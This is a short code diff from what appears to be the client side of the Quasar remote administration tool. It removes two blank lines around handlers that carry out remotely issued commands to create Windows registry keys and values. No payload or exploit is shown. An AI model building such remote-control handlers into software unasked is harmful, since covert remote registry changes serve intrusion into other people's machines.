@@ -72,7 +72,6 @@ namespace Quasar.Client.MessageHandlers
             client.Send(responsePacket);
         }
 
-
         private void Execute(ISender client, DoCreateRegistryKey message)
         {
             var responsePacket = new GetCreateRegistryKeyResponse();
@@ -141,7 +140,6 @@ namespace Quasar.Client.MessageHandlers
 
             client.Send(responsePacket);
         }
-
 
         private void Execute(ISender client, DoCreateRegistryValue message)
         {
